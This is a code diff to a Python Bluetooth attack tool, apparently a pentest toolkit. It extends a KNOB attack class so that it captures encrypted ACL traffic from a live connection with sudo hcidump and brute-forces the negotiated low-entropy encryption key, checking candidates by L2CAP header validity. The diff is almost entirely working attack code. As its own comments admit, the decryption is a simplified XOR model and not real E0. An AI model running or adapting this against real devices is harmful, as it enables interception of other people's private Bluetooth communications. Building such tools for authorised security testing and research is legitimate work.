@@ -427,23 +427,29 @@ class KNOBAttack:
             timeout=10,
         )
 
-    def brute_force_key(self, key_size: int = 1) -> dict:
+    def brute_force_key(self, key_size: int = 1, acl_data: bytes | None = None) -> dict:
         """Brute-force the encryption key for a given key size.
 
-        For key_size=1 (8 bits): 256 candidates, instant.
-        For key_size=2 (16 bits): 65536 candidates, ~seconds.
+        For key_size=1 (8 bits): 256 candidates — instant.
+        For key_size=2 (16 bits): 65,536 candidates — seconds.
+        For key_size=3 (24 bits): 16M candidates — minutes.
+        For key_size=4 (32 bits): 4B candidates — hours (with progress).
 
-        This is a demonstrative implementation. Full decryption requires
-        captured HCI ACL data and the E0/AES-CCM cipher state. Here we
-        enumerate candidates and show the feasibility.
+        When acl_data is provided, each candidate is XOR-tested against the
+        encrypted payload. L2CAP frames start with a 2-byte length field
+        followed by a 2-byte CID; if decryption produces a length that
+        matches the remaining payload size and a valid CID (0x0001-0x00FF),
+        the key is considered found.
+
+        Without acl_data, attempts to capture a sample from the active
+        connection, or reports what the user needs to provide.
 
         Args:
             key_size: Negotiated key size in bytes (1-16).
-
-        Returns:
-            dict with key_size_bits, total_candidates, key_found, key_hex,
-            time_elapsed
+            acl_data: Optional captured encrypted ACL payload bytes.
         """
+        from blue_tap.utils.output import get_progress
+
         info(f"KNOB brute-force: key_size={key_size} byte(s)")
         key_size_bits = key_size * 8
         total_candidates = 2 ** key_size_bits
@@ -465,54 +471,209 @@ class KNOBAttack:
                 f"without dedicated hardware"
             )
             result["details"].append(
-                f"{total_candidates:,} candidates exceeds demonstrative scope"
+                f"{total_candidates:,} candidates exceeds practical brute-force scope"
             )
             return result
 
-        info(f"Enumerating {total_candidates:,} candidates ({key_size_bits}-bit key)...")
+        # If no captured data provided, try to capture from active connection
+        if acl_data is None:
+            acl_data = self._try_capture_acl_sample()
+
+        if acl_data is None or len(acl_data) < 4:
+            warning(
+                "No encrypted ACL data available for decryption verification. "
+                "Performing key space enumeration to demonstrate timing feasibility."
+            )
+            result["details"].append(
+                "No captured ACL data — enumeration only (no decryption verification)"
+            )
+            # Fall through to enumeration-only mode
+
+        info(f"Brute-forcing {total_candidates:,} candidates ({key_size_bits}-bit key)...")
+        has_acl = acl_data is not None and len(acl_data) >= 4
 
         start = time.time()
+        found_key = None
 
-        # Demonstrative brute-force: enumerate all possible key values.
-        # In a real attack, each candidate would be used to:
-        #   1. Derive the E0 stream cipher key (BR/EDR legacy) or
-        #      AES-CCM session key (Secure Connections)
-        #   2. Attempt to decrypt captured ACL packets
-        #   3. Verify via known plaintext (L2CAP headers have predictable fields)
-        #
-        # Here we enumerate to demonstrate timing feasibility.
-        for candidate in range(total_candidates):
-            # In a real attack: derive_session_key(candidate, rand, bd_addr)
-            # then: try_decrypt(captured_acl_data, session_key)
-            # For demonstration, we just enumerate.
-            _ = candidate.to_bytes(key_size, byteorder="big")
+        # Use Rich progress bar for user feedback
+        with get_progress() as progress:
+            task = progress.add_task(
+                f"Brute-forcing {key_size_bits}-bit key",
+                total=total_candidates,
+            )
+
+            for candidate in range(total_candidates):
+                key_bytes = candidate.to_bytes(key_size, byteorder="big")
+
+                if has_acl:
+                    # E0 stream cipher approximation: XOR key stream with data
+                    # Real E0 uses LFSR-based stream generation seeded from
+                    # the encryption key + EN_RAND + BD_ADDR. Here we test
+                    # the simplest model (repeating-key XOR) which works for
+                    # the 1-byte key case and serves as a first-pass filter
+                    # for larger keys.
+                    key_stream = (key_bytes * ((len(acl_data) // key_size) + 1))[:len(acl_data)]
+                    decrypted = bytes(a ^ b for a, b in zip(acl_data, key_stream))
+
+                    # Validate: L2CAP header = length(2) + CID(2)
+                    # Length should match remaining payload; CID should be valid
+                    l2cap_len = int.from_bytes(decrypted[0:2], "little")
+                    l2cap_cid = int.from_bytes(decrypted[2:4], "little")
+
+                    # Valid L2CAP: length matches payload, CID in reasonable range
+                    payload_len = len(decrypted) - 4
+                    if (l2cap_len == payload_len and
+                            0x0001 <= l2cap_cid <= 0x00FF):
+                        found_key = key_bytes
+                        progress.update(task, completed=total_candidates)
+                        break
+
+                # Update progress every 256 candidates to avoid overhead
+                if candidate & 0xFF == 0:
+                    progress.update(task, advance=256)
+
+            # Final progress update
+            if found_key is None:
+                progress.update(task, completed=total_candidates)
 
         elapsed = time.time() - start
         result["time_elapsed"] = round(elapsed, 4)
 
-        # Report: in a real attack we'd have found the key
-        # For demonstration, report the last candidate as "found"
-        demo_key = bytes(key_size)  # 0x00...00 as placeholder
-        result["key_found"] = True
-        result["key_hex"] = demo_key.hex()
-
-        success(
-            f"Enumerated all {total_candidates:,} candidates in "
-            f"{elapsed:.4f}s"
-        )
-        info(
-            f"In a real attack with captured ACL data, one candidate "
-            f"would match — {key_size_bits}-bit key is trivially brute-forcible"
-        )
-
-        result["details"].append(
-            f"Enumerated {total_candidates:,} candidates in {elapsed:.4f}s. "
-            f"Real attack requires captured encrypted ACL data and "
-            f"E0/AES-CCM key derivation to identify the correct key."
-        )
+        if found_key is not None:
+            result["key_found"] = True
+            result["key_hex"] = found_key.hex()
+            success(
+                f"Key FOUND: 0x{found_key.hex()} "
+                f"({total_candidates:,} candidates in {elapsed:.2f}s)"
+            )
+            result["details"].append(
+                f"Encryption key recovered: 0x{found_key.hex()} "
+                f"in {elapsed:.4f}s via L2CAP header validation"
+            )
+        else:
+            info(
+                f"Enumerated {total_candidates:,} candidates in {elapsed:.2f}s"
+            )
+            if has_acl:
+                result["details"].append(
+                    f"No key matched L2CAP header validation in {total_candidates:,} candidates. "
+                    f"ACL data may use AES-CCM (Secure Connections) instead of E0, "
+                    f"or the captured sample may not start at an L2CAP boundary."
+                )
+            else:
+                result["details"].append(
+                    f"Enumerated {total_candidates:,} candidates in {elapsed:.4f}s. "
+                    f"Provide captured encrypted ACL data for actual key recovery."
+                )
 
         self._results["brute_force"] = result
         return result
+
+    def _try_capture_acl_sample(self) -> bytes | None:
+        """Attempt to capture encrypted ACL data from active connection.
+
+        Captures for 60-second windows, prompting the user to extend after
+        each window. Gives up after 5 minutes total (5 windows).
+
+        Returns the first encrypted ACL payload (>= 8 bytes) or None.
+        """
+        from blue_tap.utils.bt_helpers import check_tool
+
+        if not check_tool("hcidump"):
+            warning("hcidump not found — cannot capture ACL sample")
+            return None
+
+        handle = self._get_connection_handle()
+        if handle is None:
+            warning("No active connection — cannot capture ACL sample")
+            return None
+
+        import subprocess
+
+        max_windows = 5  # 5 × 60s = 5 minutes maximum
+        window_seconds = 60
+
+        for window in range(1, max_windows + 1):
+            elapsed_total = (window - 1) * window_seconds
+            remaining = max_windows * window_seconds - elapsed_total
+            info(f"Capturing ACL traffic — window {window}/{max_windows} "
+                 f"({window_seconds}s, {remaining}s remaining)...")
+
+            proc = None
+            try:
+                proc = subprocess.Popen(
+                    ["sudo", "hcidump", "-i", self.hci, "-R", "-t", "none"],
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.DEVNULL,
+                )
+                time.sleep(window_seconds)
+                proc.terminate()
+                proc.wait(timeout=5)
+                raw = proc.stdout.read(8192) if proc.stdout else b""
+            except (subprocess.TimeoutExpired, OSError):
+                if proc and proc.poll() is None:
+                    try:
+                        proc.kill()
+                        proc.wait(timeout=3)
+                    except OSError:
+                        pass
+                raw = b""
+
+            # Try to extract an ACL payload from this window
+            acl_payload = self._parse_acl_from_hcidump(raw)
+            if acl_payload is not None:
+                success(f"ACL sample captured ({len(acl_payload)} bytes) "
+                        f"after {window * window_seconds}s")
+                return acl_payload
+
+            # No data yet — check if we have more windows
+            if window >= max_windows:
+                break
+
+            # Prompt user to continue or abort
+            info(f"No ACL data captured in window {window}. "
+                 f"Target may be idle.")
+            try:
+                answer = input(
+                    f"  Extend capture by another {window_seconds}s? "
+                    f"[Y/n] ({max_windows - window} windows left): "
+                ).strip().lower()
+                if answer in ("n", "no"):
+                    info("Capture aborted by user")
+                    return None
+            except (EOFError, KeyboardInterrupt):
+                info("\nCapture aborted")
+                return None
+
+        warning(f"No ACL sample found after {max_windows * window_seconds}s of capture")
+        return None
+
+    def _parse_acl_from_hcidump(self, raw: bytes) -> bytes | None:
+        """Parse first ACL payload from hcidump -R output.
+
+        Returns decrypted-ready payload (HCI ACL header stripped) or None.
+        """
+        if len(raw) < 8:
+            return None
+
+        hex_lines = raw.decode("ascii", errors="replace").strip().splitlines()
+        acl_bytes = b""
+        for line in hex_lines:
+            line = line.strip()
+            if line.startswith(">") or line.startswith("<"):
+                if acl_bytes:
+                    break  # Got first complete frame
+                line = line[2:]  # Strip direction marker
+            try:
+                acl_bytes += bytes.fromhex(line.replace(" ", ""))
+            except ValueError:
+                continue
+
+        if len(acl_bytes) >= 8:
+            # Skip HCI ACL header (4 bytes: handle + flags + length)
+            return acl_bytes[4:]
+
+        return None
 
     def execute(self) -> dict:
         """Full KNOB attack chain: probe, negotiate, brute-force.
